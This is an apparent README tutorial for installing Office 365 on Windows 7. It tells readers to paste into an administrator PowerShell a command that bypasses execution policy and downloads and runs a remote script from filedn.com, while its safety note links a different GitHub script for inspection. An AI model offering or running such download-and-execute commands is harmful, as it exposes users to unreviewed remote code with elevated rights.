
# Download and Install Office 365 on Windows 7




## Install Office 365 on Windows 7

The latest version of Office 365 apps which will run on Windows 7 is version 2002 and the latest version of Office Deployment Tool (ODT) seems no longer works in Windows 7.
  
## Installation

Search then open Windows PowerShell as administrator.


![App Screenshot](https://s3.amazonaws.com/s3.bonben365.com/files/2023/pNJxSkLlqz8Y0vf59mzXBUs8CK6RDuPk8EcOJNz8FQXTy3zoHTbzAEbPlNf1.jpg)

Copy then right click to paste all below commands into PowerShell window at once then hit Enter.

```ps
$url="https://filedn.com/lOX1R8Sv7vhpEG9Q77kMbn0/Files/7/install.ps1"
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
Set-ExecutionPolicy Bypass -Scope Process -Force
iex ((New-Object System.Net.WebClient).DownloadString($url))
```

![App Screenshot](https://s3.amazonaws.com/s3.bonben365.com/files/2023/kZodfIIA0wZWDwlqtNV9T4MB5F4w0Jx4aNoEdZoEhgqKzHZWGEs8FoV0Ml7D.jpg)

![App Screenshot](https://s3.amazonaws.com/s3.bonben365.com/files/2023/8vTFcILJsXWHtVBCQjUa8cITjIT0rHEiqtazMKoxEtDsWUypUllsDvvWw2wu.jpg)

![App Screenshot](https://s3.amazonaws.com/s3.bonben365.com/files/2023/W4It2JDdjm9V8Be4H6O8Mt2D71WzURpRSTUrrHEixtNuhpgQwdX7UKsFaOMN.jpg)

![App Screenshot](https://s3.amazonaws.com/s3.bonben365.com/files/2023/BvCpxpPyloQ2rxlojhMuhhMGNgm9i8p352FlTZtV9GNLX8m5ix1A9qlIr2rZ.jpg)

➡️Please inspect [https://raw.githubusercontent.com/bonben365/office365-win7/main/install.ps1](https://raw.githubusercontent.com/bonben365/office365-win7/main/install.ps1) prior to running any of these scripts to ensure safety. We already know it's safe, but you should verify the security and contents of any script from the internet you are not familiar with.

## Documentation

[🌍https://bonben365.com/](https://bonben365.com/)

